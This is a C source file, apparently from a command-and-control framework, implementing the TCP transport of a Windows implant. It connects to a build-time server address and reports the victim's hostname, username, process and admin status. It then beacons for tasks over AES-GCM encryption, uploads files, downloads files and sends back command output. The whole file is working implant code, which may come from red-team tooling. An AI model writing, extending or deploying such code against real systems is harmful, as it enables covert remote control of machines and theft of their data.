#include "transport_tcp.h"
#include "transport.h"
#include "config.h"
#include "crypto.h"
#include "b64.h"

// Preset agent ID embedded at build time (-DAGENT_PRESET_ID="<uuid>").
// Sent as resume_id on first connection so the server restores the pre-registered
// session across restarts — no disk or registry access required.
#ifndef AGENT_PRESET_ID
#define AGENT_PRESET_ID ""
#endif

#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <mstcpip.h>
#include <stdlib.h>
#include <string.h>
#include <stdio.h>
#include <ctype.h>
#define SECURITY_WIN32
#include <secext.h>

#pragma comment(lib, "ws2_32.lib")

// Persistent TCP socket (opened during register, reused for beacon/result).
static SOCKET g_tcp_sock = INVALID_SOCKET;
static volatile LONG g_wsa_state = 0; /* 0=uninitialised, 1=starting, 2=ready, -1=failed */

#define TCP_MAX_FRAME (32u * 1024u * 1024u)

static char* tcp_json_escape(const char *s);

static void tcp_debug_error(const char *operation, int error_code) {
    char msg[256];
    snprintf(msg, sizeof(msg), "[agent-c][tcp] %s failed (winsock=%d)\n",
             operation, error_code);
    OutputDebugStringA(msg);
}

static int tcp_ensure_wsa(void) {
    LONG state = InterlockedCompareExchange(&g_wsa_state, 1, 0);
    if (state == 0) {
        WSADATA wsd;
        int rc = WSAStartup(MAKEWORD(2, 2), &wsd);
        InterlockedExchange(&g_wsa_state, rc == 0 ? 2 : -1);
        if (rc != 0) {
            tcp_debug_error("WSAStartup", rc);
            return 0;
        }
        return 1;
    }
    while (state == 1) {
        Sleep(1);
        state = InterlockedCompareExchange(&g_wsa_state, 0, 0);
    }
    return state == 2;
}

static void tcp_reset(void) {
    if (g_tcp_sock != INVALID_SOCKET) {
        shutdown(g_tcp_sock, SD_BOTH);
        closesocket(g_tcp_sock);
        g_tcp_sock = INVALID_SOCKET;
    }
    memset(g_agent.agent_id, 0, sizeof(g_agent.agent_id));
    memset(g_agent.aes_key, 0, sizeof(g_agent.aes_key));
    g_agent.has_key = 0;
}

/* Configure the persistent C2 socket so an idle connection is probed instead
 * of being silently discarded by a firewall/NAT.  Keep the normal socket
 * options as a fallback because some Windows environments reject the extended
 * keepalive ioctl.
 *
 * Do not install a short SO_RCVTIMEO/SO_SNDTIMEO here.  This socket is also
 * used for the request/response beacon protocol, and a 10-second I/O timeout
 * is shorter than the listener's deadline.  A delayed response would make the
 * agent reset an otherwise healthy session; the keepalive probes handle idle
 * peer detection instead. */
static void tcp_configure_socket(SOCKET s) {
    BOOL keepalive = TRUE;
    setsockopt(s, SOL_SOCKET, SO_KEEPALIVE,
               (const char*)&keepalive, sizeof(keepalive));

    // MinGW exposes this layout as struct tcp_keepalive while MSVC exposes
    // the typedef tcp_keepalive. Keep the three DWORD fields local so both
    // toolchains can compile the same source.
    struct {
        DWORD onoff;
        DWORD keepalivetime;
        DWORD keepaliveinterval;
    } ka = {1, 60000, 10000};
    DWORD returned = 0;
    WSAIoctl(s, SIO_KEEPALIVE_VALS, &ka, sizeof(ka),
             NULL, 0, &returned, NULL, NULL);
}

static int tcp_send_all(SOCKET s, const uint8_t *data, size_t len) {
    size_t sent = 0;
    while (sent < len) {
        int n = send(s, (const char *)data + sent, (int)(len - sent), 0);
        if (n < 0) {
            tcp_debug_error("send", WSAGetLastError());
            return 0;
        }
        if (n == 0) {
            tcp_debug_error("send returned zero", WSAENOTCONN);
            return 0;
        }
        sent += (size_t)n;
    }
    return 1;
}

// ── Framing helpers ───────────────────────────────────────────────────────────

// Write 4-byte LE length prefix + data.
static int tcp_write_msg(SOCKET s, const uint8_t *data, size_t len) {
    if (!data || len == 0 || len > TCP_MAX_FRAME) return 0;
    uint8_t hdr[4];
    hdr[0]=(uint8_t)(len&0xff);
    hdr[1]=(uint8_t)((len>>8)&0xff);
    hdr[2]=(uint8_t)((len>>16)&0xff);
    hdr[3]=(uint8_t)((len>>24)&0xff);
    if (!tcp_send_all(s, hdr, sizeof(hdr))) return 0;
    return len == 0 || tcp_send_all(s, data, len);
}

// Read 4-byte LE length prefix then that many bytes. Caller must free().
static uint8_t* tcp_read_msg(SOCKET s, size_t *out_len) {
    *out_len=0;
    uint8_t hdr[4]; int got=0;
    while (got<4) {
        int r=recv(s,(char*)hdr+got,4-got,0);
        if (r < 0) {
            tcp_debug_error("recv frame header", WSAGetLastError());
            return NULL;
        }
        if (r == 0) {
            tcp_debug_error("peer closed while reading frame header", 0);
            return NULL;
        }
        got+=r;
    }
    size_t len=(size_t)hdr[0]|((size_t)hdr[1]<<8)|
               ((size_t)hdr[2]<<16)|((size_t)hdr[3]<<24);
    if (len==0||len>TCP_MAX_FRAME) return NULL;
    uint8_t *buf=(uint8_t*)malloc(len+1);
    if (!buf) return NULL;
    size_t total=0;
    while (total<len) {
        int r=recv(s,(char*)buf+total,(int)(len-total),0);
        if (r < 0) {
            tcp_debug_error("recv frame body", WSAGetLastError());
            free(buf);
            return NULL;
        }
        if (r == 0) {
            tcp_debug_error("peer closed while reading frame body", 0);
            free(buf);
            return NULL;
        }
        total+=r;
    }
    buf[len]='\0';
    *out_len=len;
    return buf;
}

// ── Send plaintext registration frame {"t":"register","p":<body_json>} ───────
// Used before AES key is negotiated; p is a raw JSON object, not base64.
static int tcp_send_register(const char *body_json) {
    size_t env_sz = strlen(body_json) + 24;
    char *env = (char*)malloc(env_sz);
    if (!env) return 0;
    snprintf(env, env_sz, "{\"t\":\"register\",\"p\":%s}", body_json);
    int ok = tcp_write_msg(g_tcp_sock, (const uint8_t*)env, strlen(env));
    free(env);
    return ok;
}

// ── Read a frame and return it as a null-terminated string. Caller must free().
static char* tcp_recv_raw(void) {
    size_t resp_len=0;
    uint8_t *resp = tcp_read_msg(g_tcp_sock, &resp_len);
    if (!resp) return NULL;
    char *s = (char*)realloc(resp, resp_len + 1);
    if (!s) { free(resp); return NULL; }
    s[resp_len] = '\0';
    return s;
}

static int tcp_recv_ack(void) {
    char *ack = tcp_recv_raw();
    if (!ack) return 0;
    char type[16] = {0};
    int ok = agent_json_str(ack, "t", type, sizeof(type)) &&
             strcmp(type, "ack") == 0;
    if (ok && strstr(ack, "\"ok\":false"))
        ok = 0;
    if (!ok) tcp_debug_error("unexpected or negative TCP ACK", 0);
    free(ack);
    return ok;
}

// ── Send AES-GCM encrypted envelope {"t":"<type>","p":"<b64_ciphertext>"} ───
static int tcp_send_enc(const char *msg_type, const char *payload_json) {
    size_t enc_len=0;
    uint8_t *enc = aes_gcm_seal(g_agent.aes_key, 32,
        (const uint8_t*)payload_json, strlen(payload_json), &enc_len);
    if (!enc) return 0;
    char *b64 = b64_encode(enc, enc_len);
    free(enc);
    if (!b64) return 0;
    size_t env_sz = strlen(msg_type) + strlen(b64) + 16;
    char *env = (char*)malloc(env_sz);
    if (!env) { free(b64); return 0; }
    snprintf(env, env_sz, "{\"t\":\"%s\",\"p\":\"%s\"}", msg_type, b64);
    free(b64);
    int ok = tcp_write_msg(g_tcp_sock, (const uint8_t*)env, strlen(env));
    free(env);
    return ok;
}

// ── Receive an AES-GCM envelope of the expected type and decrypt it.
// Caller owns the returned plaintext.
static char* tcp_recv_enc(const char *expected_type) {
    size_t resp_len=0;
    uint8_t *resp = tcp_read_msg(g_tcp_sock, &resp_len);
    if (!resp) return NULL;
    char type[32] = {0};
    if (!agent_json_str((char*)resp, "t", type, sizeof(type)) ||
        !expected_type || strcmp(type, expected_type) != 0) {
        tcp_debug_error("unexpected TCP response type", 0);
        free(resp);
        return NULL;
    }
    char *b64 = agent_json_str_alloc((char*)resp, "p");
    free(resp);
    if (!b64) return NULL;
    size_t ct_len=0;
    uint8_t *ct = b64_decode(b64, &ct_len);
    free(b64);
    if (!ct) return NULL;
    size_t plain_len=0;
    uint8_t *plain = aes_gcm_open(g_agent.aes_key, 32, ct, ct_len, &plain_len);
    free(ct);
    return (char*)plain;
}

// ── TCP connect ───────────────────────────────────────────────────────────────

static SOCKET tcp_connect(void) {
    // Parse host:port from AGENT_SERVER_URL ("tcp://host:port" or "host:port").
    const char *url = AGENT_SERVER_URL;
    if (strncmp(url, "tcp://", 6) == 0) url += 6;
    char host[256]={0}; int port = 8080;
    if (*url == '[') {
        const char *end = strchr(url, ']');
        if (!end || (end[1] && end[1] != ':')) {
            tcp_debug_error("invalid bracketed TCP endpoint", 0);
            return INVALID_SOCKET;
        }
        size_t hl = (size_t)(end - url - 1);
        if (hl == 0 || hl >= sizeof(host)) {
            tcp_debug_error("invalid TCP host", 0);
            return INVALID_SOCKET;
        }
        memcpy(host, url + 1, hl);
        host[hl] = '\0';
        if (end[1] == ':') port = atoi(end + 2);
    } else {
        const char *colon = strrchr(url, ':');
        if (colon && strchr(url, ':') == colon) {
            size_t hl = (size_t)(colon - url);
            if (hl == 0 || hl >= sizeof(host)) {
                tcp_debug_error("invalid TCP host", 0);
                return INVALID_SOCKET;
            }
            memcpy(host, url, hl);
            host[hl]='\0';
            port = atoi(colon + 1);
        } else {
            strncpy(host, url, sizeof(host)-1);
        }
    }
    if (!host[0] || port < 1 || port > 65535) {
        tcp_debug_error("invalid TCP endpoint", 0);
        return INVALID_SOCKET;
    }

    if (!tcp_ensure_wsa()) return INVALID_SOCKET;

    char port_text[8];
    snprintf(port_text, sizeof(port_text), "%d", port);
    struct addrinfo hints = {0}, *results = NULL;
    hints.ai_socktype = SOCK_STREAM;
    hints.ai_protocol = IPPROTO_TCP;
    int gai_rc = getaddrinfo(host, port_text, &hints, &results);
    if (gai_rc != 0) {
        tcp_debug_error("getaddrinfo", gai_rc);
        return INVALID_SOCKET;
    }

    SOCKET connected = INVALID_SOCKET;
    for (struct addrinfo *it = results; it; it = it->ai_next) {
        SOCKET s = socket(it->ai_family, it->ai_socktype, it->ai_protocol);
        if (s == INVALID_SOCKET) continue;
        tcp_configure_socket(s);
        if (connect(s, it->ai_addr, (int)it->ai_addrlen) == 0) {
            connected = s;
            break;
        }
        tcp_debug_error("connect", WSAGetLastError());
        closesocket(s);
    }
    freeaddrinfo(results);
    return connected;
}

/* Escape command output before embedding it in the encrypted result JSON.
 * HTTP already goes through the equivalent helper in transport.c; TCP must do
 * the same because the server parses the decrypted result as JSON. */
static char* tcp_json_escape(const char *s) {
    if (!s) s = "";
    size_t len = strlen(s);
    if (len > (SIZE_MAX - 1) / 6) return NULL;

    char *out = (char*)malloc(len * 6 + 1);
    if (!out) return NULL;
    static const char hex[] = "0123456789abcdef";
    size_t j = 0;
    for (size_t i = 0; i < len; i++) {
        unsigned char ch = (unsigned char)s[i];
        switch (ch) {
        case '"': out[j++]='\\'; out[j++]='"'; break;
        case '\\': out[j++]='\\'; out[j++]='\\'; break;
        case '\b': out[j++]='\\'; out[j++]='b'; break;
        case '\f': out[j++]='\\'; out[j++]='f'; break;
        case '\n': out[j++]='\\'; out[j++]='n'; break;
        case '\r': out[j++]='\\'; out[j++]='r'; break;
        case '\t': out[j++]='\\'; out[j++]='t'; break;
        default:
            if (ch < 0x20) {
                out[j++]='\\'; out[j++]='u';
                out[j++]='0'; out[j++]='0';
                out[j++]=hex[ch >> 4]; out[j++]=hex[ch & 0x0f];
            } else {
                out[j++]=(char)ch;
            }
            break;
        }
    }
    out[j] = '\0';
    return out;
}

static void tcp_get_process_name(char *out, size_t out_sz) {
    if (!out || out_sz == 0) return;
    strncpy(out, "agent.exe", out_sz - 1);
    out[out_sz - 1] = '\0';
    DWORD n = GetModuleFileNameA(NULL, out, (DWORD)out_sz);
    if (n == 0 || n >= out_sz) {
        strncpy(out, "agent.exe", out_sz - 1);
        out[out_sz - 1] = '\0';
        return;
    }
    char *slash = strrchr(out, '\\');
    if (slash) memmove(out, slash + 1, strlen(slash + 1) + 1);
}

static int tcp_is_elevated(void) {
    HANDLE token = NULL;
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &token)) return 0;

    TOKEN_ELEVATION elevation = {0};
    DWORD size = sizeof(elevation);
    if (GetTokenInformation(token, TokenElevation, &elevation,
                            sizeof(elevation), &size) && elevation.TokenIsElevated) {
        CloseHandle(token);
        return 1;
    }

    HANDLE linked = NULL;
    size = sizeof(linked);
    if (GetTokenInformation(token, TokenLinkedToken, &linked,
                            sizeof(linked), &size) && linked) {
        ZeroMemory(&elevation, sizeof(elevation));
        size = sizeof(elevation);
        BOOL elevated = GetTokenInformation(linked, TokenElevation, &elevation,
                                            sizeof(elevation), &size) &&
                        elevation.TokenIsElevated;
        CloseHandle(linked);
        CloseHandle(token);
        return elevated ? 1 : 0;
    }
    CloseHandle(token);
    return 0;
}

// ── Transport operations ──────────────────────────────────────────────────────

int transport_tcp_register(void) {
    tcp_reset();
    g_tcp_sock = tcp_connect();
    if (g_tcp_sock == INVALID_SOCKET) return 0;

    char hostname[128]="UNKNOWN", username[256]="UNKNOWN";
    char process_name[MAX_PATH]="agent.exe";
    DWORD hsz=sizeof(hostname);
    GetComputerNameA(hostname, &hsz);
    for (DWORD i = 0; i < hsz; i++) hostname[i] = (char)tolower((unsigned char)hostname[i]);
    ULONG usz=sizeof(username);
    if (!GetUserNameExA(2 /*NameSamCompatible*/, username, &usz))
        GetUserNameA(username, (DWORD*)&usz);
    tcp_get_process_name(process_name, sizeof(process_name));

    char *hostname_j = tcp_json_escape(hostname);
    char *username_json = tcp_json_escape(username);
    char *process_json = tcp_json_escape(process_name);
    char *parent_json = tcp_json_escape(AGENT_PARENT_ID);
    if (!hostname_j || !username_json || !process_json || !parent_json) {
        free(hostname_j);
        free(username_json);
        free(process_json);
        free(parent_json);
        tcp_reset();
        return 0;
    }

    // Registration is plaintext — AES key not yet known.
    // Determine resume_id: prefer in-memory agent_id (same-process reconnect),
    // fall back to compile-time AGENT_PRESET_ID (cross-restart persistent identity).
    const char *resume_id = g_agent.agent_id[0] ? g_agent.agent_id
                          : (AGENT_PRESET_ID[0]  ? AGENT_PRESET_ID : NULL);
    char body[2048];
    int body_len;
    if (resume_id) {
        body_len = snprintf(body, sizeof(body),
            "{\"hostname\":\"%s\",\"username\":\"%s\",\"os\":\"windows/amd64\","
            "\"pid\":%lu,\"transport\":\"tcp\","
            "\"sleep_sec\":%d,\"jitter_pct\":%d,\"process_name\":\"%s\","
            "\"is_admin\":%s,\"parent_id\":\"%s\",\"language\":\"c\","
            "\"resume_id\":\"%s\"}",
            hostname_j, username_json, (unsigned long)GetCurrentProcessId(),
            AGENT_SLEEP_SEC, AGENT_JITTER_PCT, process_json,
            tcp_is_elevated() ? "true" : "false", parent_json,
            resume_id);
    } else {
        body_len = snprintf(body, sizeof(body),
            "{\"hostname\":\"%s\",\"username\":\"%s\",\"os\":\"windows/amd64\","
            "\"pid\":%lu,\"transport\":\"tcp\","
            "\"sleep_sec\":%d,\"jitter_pct\":%d,\"process_name\":\"%s\","
            "\"is_admin\":%s,\"parent_id\":\"%s\",\"language\":\"c\"}",
            hostname_j, username_json, (unsigned long)GetCurrentProcessId(),
            AGENT_SLEEP_SEC, AGENT_JITTER_PCT, process_json,
            tcp_is_elevated() ? "true" : "false", parent_json);
    }
    free(hostname_j);
    free(username_json);
    free(process_json);
    free(parent_json);
    if (body_len < 0 || (size_t)body_len >= sizeof(body)) {
        tcp_debug_error("registration body too large", 0);
        tcp_reset();
        return 0;
    }

    if (!tcp_send_register(body)) {
        tcp_reset();
        return 0;
    }

    // Server responds with plaintext {"t":"register_resp","p":{"agent_id":"...","aes_key":"...",...}}
    char *resp_raw = tcp_recv_raw();
    if (!resp_raw) {
        tcp_reset();
        return 0;
    }

    char response_type[32]={0};
    if (!agent_json_str(resp_raw, "t", response_type, sizeof(response_type)) ||
        strcmp(response_type, "register_resp") != 0) {
        tcp_debug_error("unexpected registration response type", 0);
        free(resp_raw);
        tcp_reset();
        return 0;
    }
    char agent_id[64]={0}, aes_key_b64[128]={0};
    agent_json_str(resp_raw, "agent_id", agent_id, sizeof(agent_id));
    agent_json_str(resp_raw, "aes_key",  aes_key_b64, sizeof(aes_key_b64));
    free(resp_raw);

    if (!agent_id[0] || !aes_key_b64[0]) {
        tcp_reset();
        return 0;
    }

    size_t key_len=0;
    uint8_t *key = b64_decode(aes_key_b64, &key_len);
    if (!key || key_len < 32) {
        free(key);
        tcp_reset();
        return 0;
    }

    strncpy(g_agent.agent_id, agent_id, sizeof(g_agent.agent_id) - 1);
    memcpy(g_agent.aes_key, key, 32);
    g_agent.has_key = 1;
    free(key);
    return 1;
}

AgentTask* transport_tcp_beacon(int *count) {
    *count = 0;
    if (g_tcp_sock == INVALID_SOCKET || !g_agent.has_key) return NULL;

    if (!tcp_send_enc("beacon", "{}")) {
        tcp_reset();
        return NULL;
    }

    char *resp_plain = tcp_recv_enc("tasks");
    if (!resp_plain) {
        tcp_reset();
        return NULL;
    }

    AgentTask *tasks = agent_parse_tasks((const uint8_t*)resp_plain,
                                         strlen(resp_plain), count);
    free(resp_plain);
    return tasks;
}

void transport_tcp_upload_file(long long task_id, const char *filename,
                               const uint8_t *data, size_t data_len) {
    if (g_tcp_sock == INVALID_SOCKET || !g_agent.has_key) return;

    char *b64_data = b64_encode(data, data_len);
    if (!b64_data) return;

    char *esc_filename = tcp_json_escape(filename);
    if (!esc_filename) { free(b64_data); return; }

    size_t payload_sz = strlen(esc_filename) + strlen(b64_data) + 64;
    char *payload = (char*)malloc(payload_sz);
    if (!payload) { free(b64_data); free(esc_filename); return; }
    snprintf(payload, payload_sz,
        "{\"task_id\":%lld,\"filename\":\"%s\",\"data\":\"%s\"}",
        task_id, esc_filename, b64_data);
    free(b64_data);
    free(esc_filename);

    if (!tcp_send_enc("upload", payload)) {
        free(payload);
        tcp_reset();
        return;
    }
    free(payload);

    if (!tcp_recv_ack()) tcp_reset();
}

uint8_t* transport_tcp_download_file(const char *filename, size_t *out_len) {
    *out_len = 0;
    if (g_tcp_sock == INVALID_SOCKET || !g_agent.has_key) return NULL;

    char *esc_filename = tcp_json_escape(filename);
    if (!esc_filename) return NULL;

    size_t payload_sz = strlen(esc_filename) + 16;
    char *payload = (char*)malloc(payload_sz);
    if (!payload) { free(esc_filename); return NULL; }
    snprintf(payload, payload_sz, "{\"filename\":\"%s\"}", esc_filename);
    free(esc_filename);

    if (!tcp_send_enc("download", payload)) {
        free(payload);
        tcp_reset();
        return NULL;
    }
    free(payload);

    char *resp_plain = tcp_recv_enc("dl_resp");
    if (!resp_plain) {
        tcp_reset();
        return NULL;
    }

    char *b64 = agent_json_str_alloc(resp_plain, "data");
    free(resp_plain);
    if (!b64) return NULL;

    uint8_t *out = b64_decode(b64, out_len);
    free(b64);
    return out;
}

void transport_tcp_send_result(long long task_id, const char *output,
                                const char *error, int is_admin) {
    if (g_tcp_sock == INVALID_SOCKET || !g_agent.has_key) return;

    char *esc_output = tcp_json_escape(output);
    char *esc_error  = tcp_json_escape(error);
    if (!esc_output || !esc_error) {
        free(esc_output);
        free(esc_error);
        tcp_reset();
        return;
    }

    size_t body_sz = strlen(esc_output) + strlen(esc_error) + 256;
    char *body = (char*)malloc(body_sz);
    if (!body) {
        free(esc_output);
        free(esc_error);
        return;
    }
    snprintf(body, body_sz,
        "{\"task_id\":%lld,\"output\":\"%s\",\"error\":\"%s\",\"is_admin\":%s}",
        task_id, esc_output, esc_error,
        is_admin?"true":"false");
    free(esc_output);
    free(esc_error);

    if (!tcp_send_enc("result", body)) {
        free(body);
        tcp_reset();
        return;
    }
    free(body);

    // Drain plaintext ACK {"t":"ack"} — no encrypted payload.
    if (!tcp_recv_ack()) tcp_reset();
}
